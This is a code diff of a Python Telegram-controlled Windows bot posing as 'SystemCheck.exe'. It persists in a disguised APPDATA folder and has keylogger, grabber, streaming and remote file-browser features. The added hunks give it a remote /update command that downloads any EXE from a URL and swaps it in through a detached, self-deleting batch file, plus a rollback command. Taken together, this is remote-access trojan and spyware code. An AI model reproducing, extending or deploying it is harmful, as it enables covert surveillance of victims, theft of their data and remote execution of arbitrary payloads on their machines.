+        logger.warning(f"Failed to write update backup file: {e}")
+
+def _read_update_backup():
+    """Return backup info dict or None."""
+    try:
+        import json
+        if os.path.exists(_UPDATE_BACKUP_FILE):
+            with open(_UPDATE_BACKUP_FILE, 'r', encoding='utf-8') as f:
+                return json.load(f)
+    except Exception:
+        pass
+    return None
+
+def _clear_update_backup():
+    try:
+        if os.path.exists(_UPDATE_BACKUP_FILE):
+            os.remove(_UPDATE_BACKUP_FILE)
+    except Exception:
+        pass
+
+def _cleanup_new_exe(path: str):
+    try:
+        if path and os.path.exists(path):
+            os.remove(path)
+    except Exception:
+        pass
+
+
+@bot.message_handler(commands=['update'])
+def cmd_update(m):
+    """/update [url] — tải EXE mới từ NAS/URL, backup rồi swap & restart"""
+    if m.from_user.id != ADMIN_ID:
+        return
+
+    if not getattr(sys, 'frozen', False):
+        bot.reply_to(m,
+            "⚠️ Bot đang chạy từ source .py.\n"
+            "Lệnh /update chỉ hoạt động khi chạy dưới dạng *SystemCheck.exe*.",
+            parse_mode="Markdown")
+        return
+
+    parts = m.text.split(maxsplit=1)
+    url = parts[1].strip() if len(parts) > 1 else None
+
+    # Mode B: no URL → use WebDAV from .env
+    if not url:
+        if not NAS_WEBDAV_URL:
+            bot.reply_to(m,
+                "❌ Chưa cấu hình `NAS_WEBDAV_URL` trong .env\n\n"
+                "*Cách dùng:*\n"
+                "`/update <url>` — dùng DSM share link hoặc URL trực tiếp\n\n"
+                "*Hoặc thêm vào .env để dùng WebDAV:*\n"
+                "`NAS_WEBDAV_URL=https://domain:port/path/SystemCheck.exe`\n"
+                "`NAS_WEBDAV_USER=admin`\n"
+                "`NAS_WEBDAV_PASS=password`",
+                parse_mode="Markdown")
+            return
+        url = NAS_WEBDAV_URL
+        auth = (NAS_WEBDAV_USER, NAS_WEBDAV_PASS) if NAS_WEBDAV_USER else None
+        mode_label = "WebDAV (NAS)"
+    else:
+        # Mode A: URL provided
+        if not url.startswith(('http://', 'https://')):
+            bot.reply_to(m, "❌ URL phải bắt đầu bằng `http://` hoặc `https://`",
+                         parse_mode="Markdown")
+            return
+        auth = None
+        mode_label = "URL trực tiếp"
+
+    def download_task():
+        exe_path = sys.executable
+        new_path = os.path.join(BASE_DIR, '_SystemCheck_new.exe')
+        try:
+            status_msg = bot.reply_to(m, f"⬇️ Đang kết nối ({mode_label})...")
+
+            try:
+                resp = requests.get(
+                    url, stream=True, auth=auth, timeout=60, verify=True,
+                    headers={'User-Agent': 'SystemCheck-Updater/1.0'})
+                resp.raise_for_status()
+            except requests.exceptions.SSLError:
+                bot.edit_message_text(
+                    "❌ Lỗi SSL certificate.\n"
+                    "DSM cần bật HTTPS với Let's Encrypt tại Control Panel → Security.",
+                    m.chat.id, status_msg.message_id)
+                return
+            except requests.exceptions.ConnectionError:
+                bot.edit_message_text(
+                    "❌ Không kết nối được. Kiểm tra URL/NAS có online không.",
+                    m.chat.id, status_msg.message_id)
+                return
+            except requests.exceptions.HTTPError:
+                bot.edit_message_text(
+                    f"❌ HTTP {resp.status_code}. Kiểm tra đường dẫn file và quyền truy cập.",
+                    m.chat.id, status_msg.message_id)
+                return
+
+            total = int(resp.headers.get('content-length', 0))
+            downloaded = 0
+            last_edit = time.time()
+
+            with open(new_path, 'wb') as f:
+                for chunk in resp.iter_content(chunk_size=512 * 1024):  # 512KB chunks
+                    if chunk:
+                        f.write(chunk)
+                        downloaded += len(chunk)
+                        now = time.time()
+                        if now - last_edit >= 4:
+                            if total:
+                                pct = int(downloaded / total * 100)
+                                txt = (f"⬇️ Đang tải ({mode_label})... {pct}%\n"
+                                       f"{downloaded/1024/1024:.1f} / {total/1024/1024:.1f} MB")
+                            else:
+                                txt = f"⬇️ Đang tải ({mode_label})... {downloaded/1024/1024:.1f} MB"
+                            try:
+                                bot.edit_message_text(txt, m.chat.id, status_msg.message_id)
+                            except Exception:
+                                pass
+                            last_edit = now
+
+            file_size = os.path.getsize(new_path)
+
+            # Validate Windows PE header
+            with open(new_path, 'rb') as f:
+                header = f.read(2)
+            if header != b'MZ':
+                _cleanup_new_exe(new_path)
+                bot.edit_message_text(
+                    "❌ File tải về không phải EXE hợp lệ (không có MZ header).\n"
+                    "Kiểm tra URL có trỏ đúng đến file .exe không.",
+                    m.chat.id, status_msg.message_id)
+                return
+            if file_size < 5 * 1024 * 1024:
+                _cleanup_new_exe(new_path)
+                bot.edit_message_text(
+                    f"❌ File chỉ {file_size//1024} KB — quá nhỏ, nghi tải sai file.",
+                    m.chat.id, status_msg.message_id)
+                return
+
+            markup = types.InlineKeyboardMarkup()
+            markup.row(
+                types.InlineKeyboardButton("✅ Apply & Restart", callback_data="update|apply"),
+                types.InlineKeyboardButton("❌ Hủy", callback_data="update|cancel_dl"),
+            )
+            bot.edit_message_text(
+                f"✅ Tải xong: *{file_size/1024/1024:.1f} MB*\n"
+                f"📡 Nguồn: {mode_label}\n\n"
+                f"⚠️ Xác nhận swap & restart?",
+                m.chat.id, status_msg.message_id,
+                reply_markup=markup, parse_mode="Markdown")
+            _set_pending_update(m.chat.id, {'new': new_path, 'exe': exe_path})
+            audit("/update download ok", m.from_user.id)
+
+        except requests.exceptions.Timeout:
+            _cleanup_new_exe(new_path)
+            bot.reply_to(m, "❌ Timeout khi tải. Thử lại sau.")
+        except Exception as e:
+            _cleanup_new_exe(new_path)
+            logger.error(f"cmd_update download_task failed: {e}")
+            bot.reply_to(m, f"❌ Lỗi tải: {e}")
+
+    _executor.submit(download_task)
+    audit("/update", m.from_user.id)
+
+
+@bot.message_handler(commands=['rollback'])
+def cmd_rollback(m):
+    """/rollback — khôi phục EXE cũ sau khi update"""
+    if m.from_user.id != ADMIN_ID:
+        return
+    if not getattr(sys, 'frozen', False):
+        bot.reply_to(m, "⚠️ Chỉ hoạt động khi chạy dưới dạng EXE.")
+        return
+
+    info = _read_update_backup()
+    if not info:
+        bot.reply_to(m, "ℹ️ Không có backup nào để rollback.")
+        return
+
+    backup_path = info.get('backup', '')
+    if not os.path.exists(backup_path):
+        bot.reply_to(m,
+            f"❌ Backup không còn tồn tại: `{os.path.basename(backup_path)}`",
+            parse_mode="Markdown")
+        _clear_update_backup()
+        return
+
+    markup = types.InlineKeyboardMarkup()
+    markup.row(
+        types.InlineKeyboardButton("↩️ Xác nhận Rollback", callback_data="update|rollback_ok"),
+        types.InlineKeyboardButton("❌ Hủy", callback_data="update|rollback_no"),
+    )
+    bot.reply_to(m,
+        f"⚠️ Rollback về: `{os.path.basename(backup_path)}`\nBot sẽ restart sau khi swap.",
+        reply_markup=markup, parse_mode="Markdown")
+
+
+@bot.message_handler(commands=['cancel'])
+def cmd_cancel(m):
+    """/cancel — huỷ lệnh đang chờ (upload)"""
+    if m.from_user.id != ADMIN_ID:
+        return
+    cid = m.chat.id
+    cleared = []
+    upload = _get_upload_state(cid)
+    if upload:
+        _del_upload_state(cid)
+        cleared.append("upload")
+    pending = _pop_pending_update(cid)
+    if pending:
+        _cleanup_new_exe(pending.get('new'))
+        cleared.append("update")
+    if cleared:
+        bot.reply_to(m, f"❌ Đã hủy: {', '.join(cleared)}")
+    else:
+        bot.reply_to(m, "ℹ️ Không có thao tác nào đang chờ.")
 
 # ==============================================================================
 # BLOCKING MANAGEMENT
@@ -1417,11 +1807,11 @@ def block_mgr(m):
         if cmd == "/block":
             for t in targets:
                 if t not in BLOCKED_DATA[key]:
-                    BLOCKED_DATA[key].append(t)
-                    # Only apply firewall/hosts immediately if block mode is active
+                    # Only persist site blocks after the system-level block succeeds.
                     if type_ == "site" and block_mode_active and not block_site(t):
                         failed.append(t)
                         continue
+                    BLOCKED_DATA[key].append(t)
                     added.append(t)
                 else:
                     existed.append(t)
@@ -1429,11 +1819,11 @@ def block_mgr(m):
         else:  # unblock
             for t in targets:
                 if t in BLOCKED_DATA[key]:
-                    BLOCKED_DATA[key].remove(t)
-                    # Always remove firewall/hosts when explicitly unblocking
+                    # Only forget the entry after rollback of system-level rules succeeds.
                     if type_ == "site" and not unblock_site(t):
                         failed.append(t)
                         continue
+                    BLOCKED_DATA[key].remove(t)
                     removed.append(t)
                 else:
                     missing.append(t)
@@ -1612,19 +2002,18 @@ def cmd_list(m):
 
 @bot.message_handler(content_types=['document'])
 def handle_upload(m):
-    """Handle file upload"""
+    """Handle file upload (file browser → upload to directory)"""
     if m.from_user.id != ADMIN_ID:
         return
 
-    if m.chat.id not in upload_state:
+    target_dir = _get_upload_state(m.chat.id)
+    if not target_dir:
         return
 
     try:
         if m.document.file_size / (1024 * 1024) > 19.5:
             bot.reply_to(m, "❌ File > 20MB")
             return
-
-        target_dir = upload_state[m.chat.id]
         file_name = m.document.file_name
 
         bot.reply_to(m, "⏳ Đang tải...")
@@ -1636,12 +2025,13 @@ def handle_upload(m):
             f.write(downloaded_file)
 
         bot.reply_to(m, f"✅ Đã lưu vào `{target_dir}`", parse_mode="Markdown")
-        del upload_state[m.chat.id]
+        _del_upload_state(m.chat.id)
         bot_stats.increment_command()
         logger.info(f"File uploaded: {filepath}")
 
     except Exception as e:
         logger.error(f"File upload failed: {e}")
+        _del_upload_state(m.chat.id)  # clear stale state so user isn't stuck
         bot.reply_to(m, f"❌ Lỗi: {e}")
 
 @bot.callback_query_handler(func=lambda c: c.from_user.id == ADMIN_ID)
@@ -1659,13 +2049,145 @@ def cb_handler(c):
 
         # Stream stop button
         if data == "stream|stop":
-            ev = active_streams.pop(cid, None)
-            if ev:
-                ev.set()
+            state = _get_stream(cid)
+            if state:
+                state['event'].set()
                 bot.answer_callback_query(c.id, "🛑 Đã dừng stream")
                 bot.edit_message_reply_markup(cid, msg.message_id, reply_markup=None)
             else:
                 bot.answer_callback_query(c.id, "ℹ️ Không có stream")
+            return
+
+        # Remote update — apply swap or cancel download
+        if data == "update|apply":
+            pending = _pop_pending_update(cid)
+            bot.answer_callback_query(c.id, "🔄 Đang apply...")
+            if not pending:
+                bot.edit_message_text("❌ Không có update đang chờ.", cid, msg.message_id)
+                return
+
+            def do_swap(p=pending):
+                import shutil
+                new_path = p['new']
+                exe_path = p['exe']
+                try:
+                    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
+                    exe_dir  = os.path.dirname(exe_path)
+                    exe_stem = os.path.splitext(os.path.basename(exe_path))[0]
+                    backup_path = os.path.join(exe_dir, f"{exe_stem}_backup_{ts}.exe")
+
+                    # Backup current EXE
+                    shutil.copy2(exe_path, backup_path)
+                    # Persist backup info for /rollback after restart
+                    _write_update_backup(backup_path, exe_path)
+
+                    # Detached bat: wait 3s, swap, start new EXE, self-delete
+                    # UTF-8 BOM + chcp 65001 so Vietnamese/non-ASCII paths are handled correctly
+                    bat = (
+                        "@chcp 65001 >nul\r\n"
+                        "@echo off\r\n"
+                        "timeout /t 3 /nobreak >nul\r\n"
+                        f'move /y "{new_path}" "{exe_path}"\r\n'
+                        f'start "" "{exe_path}"\r\n'
+                        'del "%~f0"\r\n'
+                    )
+                    bat_path = os.path.join(BASE_DIR, '_update_swap.bat')
+                    with open(bat_path, 'w', encoding='utf-8-sig') as f:
+                        f.write(bat)
+
+                    subprocess.Popen(
+                        ['cmd.exe', '/c', bat_path],
+                        creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
+                        close_fds=True,
+                        cwd=BASE_DIR,
+                    )
+
+                    backup_name = os.path.basename(backup_path)
+                    bot.edit_message_text(
+                        f"🔄 Swap đang diễn ra, bot sẽ restart sau ~3 giây.\n"
+                        f"📦 Backup: `{backup_name}`\n"
+                        f"Dùng `/rollback` sau khi restart nếu cần.",
+                        cid, msg.message_id, parse_mode="Markdown")
+                    audit("/update apply", ADMIN_ID)
+                    logger.info(f"Swap launched: {exe_path} | backup: {backup_path}")
+                    _write_exit_reason("update_restart")
+                    time.sleep(0.5)
+                    os._exit(0)
+                except Exception as e:
+                    logger.error(f"do_swap failed: {e}")
+                    bot.send_message(cid, f"❌ Swap thất bại: {e}")
+                    _cleanup_new_exe(new_path)
+
+            try:
+                _executor.submit(do_swap)
+            except Exception as e:
+                # Restore state so user can retry apply/cancel.
+                _set_pending_update(cid, pending)
+                logger.error(f"submit do_swap failed: {e}")
+                bot.send_message(cid, f"❌ Không thể chạy update: {e}")
+            return
+
+        if data == "update|cancel_dl":
+            pending = _pop_pending_update(cid)
+            if pending:
+                _cleanup_new_exe(pending.get('new'))
+            bot.answer_callback_query(c.id, "❌ Đã hủy")
+            bot.edit_message_text("❌ Đã hủy update.", cid, msg.message_id)
+            return
+
+        # Remote update — rollback to backup EXE
+        if data == "update|rollback_ok":
+            info = _read_update_backup()
+            bot.answer_callback_query(c.id, "↩️ Đang rollback...")
+            if not info:
+                bot.edit_message_text("❌ Không tìm thấy backup.", cid, msg.message_id)
+                return
+
+            def do_rollback(i=info):
+                backup_path = i.get('backup', '')
+                exe_path    = i.get('exe', sys.executable)
+                try:
+                    if not os.path.exists(backup_path):
+                        bot.send_message(cid, "❌ Backup file không còn tồn tại.")
+                        _clear_update_backup()
+                        return
+
+                    bat = (
+                        "@chcp 65001 >nul\r\n"
+                        "@echo off\r\n"
+                        "timeout /t 3 /nobreak >nul\r\n"
+                        f'move /y "{backup_path}" "{exe_path}"\r\n'
+                        f'start "" "{exe_path}"\r\n'
+                        'del "%~f0"\r\n'
+                    )
+                    bat_path = os.path.join(BASE_DIR, '_rollback_swap.bat')
+                    with open(bat_path, 'w', encoding='utf-8-sig') as f:
+                        f.write(bat)
+
+                    subprocess.Popen(
+                        ['cmd.exe', '/c', bat_path],
+                        creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
+                        close_fds=True,
+                        cwd=BASE_DIR,
+                    )
+                    bot.edit_message_text(
+                        "↩️ Rollback bat đã chạy. Bot sẽ restart về bản cũ sau ~3 giây.",
+                        cid, msg.message_id)
+                    audit("/rollback apply", ADMIN_ID)
+                    logger.info(f"Rollback launched → {exe_path}")
+                    _write_exit_reason("rollback_restart")
+                    time.sleep(0.5)
+                    os._exit(0)
+                except Exception as e:
+                    logger.error(f"do_rollback failed: {e}")
+                    bot.send_message(cid, f"❌ Rollback thất bại: {e}")
+
+            _executor.submit(do_rollback)
+            return
+
+        if data == "update|rollback_no":
+            bot.answer_callback_query(c.id, "❌ Đã hủy")
+            bot.edit_message_text("❌ Đã hủy rollback.", cid, msg.message_id)
             return
 
         # Keylogger controls — format: kl|action
@@ -1734,6 +2256,7 @@ def cb_handler(c):
             if action == "confirm":
                 bot.send_message(cid, "🛑 Bot đang tắt...")
                 audit("/stop confirmed", c.from_user.id)
+                _write_exit_reason("manual_stop")
                 # Kill watchdog (parent process) if running as frozen EXE
                 try:
                     if getattr(sys, 'frozen', False):
@@ -1749,6 +2272,21 @@ def cb_handler(c):
                             proc.terminate()
                 except Exception:
                     pass
+                import time as _t
+                _t.sleep(0.5)
+                os._exit(0)
+            else:
+                bot.send_message(cid, "❌ Đã hủy.")
+            return
+
+        # Restart bot (watchdog restarts automatically)
+        if data.startswith("restart|"):
+            action = data.split("|", 1)[1]
+            bot.answer_callback_query(c.id)
+            if action == "confirm":
+                bot.send_message(cid, "🔄 Bot đang khởi động lại...")
+                audit("/restart confirmed", c.from_user.id)
+                _write_exit_reason("manual_restart")
                 import time as _t
                 _t.sleep(0.5)
                 os._exit(0)
@@ -1802,7 +2340,7 @@ def cb_handler(c):
                 except Exception as e:
                     bot.send_message(cid, f"❌ Lỗi tải file: {e}")
 
-            threading.Thread(target=download_task, daemon=True).start()
+            _executor.submit(download_task)
             return
 
         # Quick peek — show first 50 lines of text files
@@ -1872,7 +2410,7 @@ def cb_handler(c):
         # File upload
         if data.startswith("up|"):
             target_path = data.split("|", 1)[1]
-            upload_state[cid] = target_path
+            _set_upload_state(cid, target_path)
             bot.answer_callback_query(c.id, "✅")
             bot.send_message(cid, f"📤 Gửi file (<20MB) để lưu vào: `{target_path}`",
                              parse_mode="Markdown")
@@ -1894,6 +2432,9 @@ def cb_handler(c):
 
 if __name__ == "__main__":
     try:
+        # Ensure CWD = BASE_DIR so all relative-path file I/O (grabber, media) lands in the right place
+        os.chdir(BASE_DIR)
+
         # Check persistence
         appdata = os.getenv('APPDATA')
         target_dir = os.path.join(appdata, "Microsoft", "Windows", "SystemMonitor")
@@ -1921,7 +2462,8 @@ if __name__ == "__main__":
         def firewall_refresh_loop():
             while True:
                 try:
-                    refresh_firewall_blocks(BLOCKED_DATA.get("sites", []))
+                    if block_mode_active and BLOCKED_DATA.get("sites", []):
+                        refresh_firewall_blocks(BLOCKED_DATA.get("sites", []))
                 except Exception as e:
                     logger.error(f"Firewall refresh loop error: {e}")
                 time.sleep(1800)  # 30 minutes
@@ -1932,21 +2474,32 @@ if __name__ == "__main__":
         logger.info(f"🟢 SYSTEM ONLINE | Host: {platform.node()}")
         
         try:
-            bot.send_message(
-                ADMIN_ID,
-                f"🟢 **SYSTEM ONLINE**\n"
-                f"Host: {platform.node()}\n"
-                f"IP: {socket.gethostbyname(socket.gethostname())}\n"
-                f"Khởi động: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}",
-                parse_mode="Markdown"
-            )
-        except:
+            # Avoid spam when process is restarted multiple times in a short window.
+            now_ts = int(time.time())
+            last_notice_ts = int(CURRENT_SETTINGS.get("last_online_notice_ts", 0) or 0)
+            if now_ts - last_notice_ts >= 120:
+                bot.send_message(
+                    ADMIN_ID,
+                    f"🟢 **SYSTEM ONLINE**\n"
+                    f"Host: {platform.node()}\n"
+                    f"IP: {socket.gethostbyname(socket.gethostname())}\n"
+                    f"Khởi động: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}",
+                    parse_mode="Markdown"
+                )
+                CURRENT_SETTINGS["last_online_notice_ts"] = now_ts
+                save_settings(SETTINGS_FILE, CURRENT_SETTINGS)
+        except Exception:
             pass
         
         # Polling
         while True:
             try:
-                bot.infinity_polling(timeout=10, long_polling_timeout=5, skip_pending=True)
+                bot.infinity_polling(
+                    timeout=10,
+                    long_polling_timeout=5,
+                    skip_pending=True,
+                    allowed_updates=['message', 'callback_query'],
+                )
             except Exception as e:
                 logger.error(f"Polling error: {e}", exc_info=True)
                 time.sleep(5)
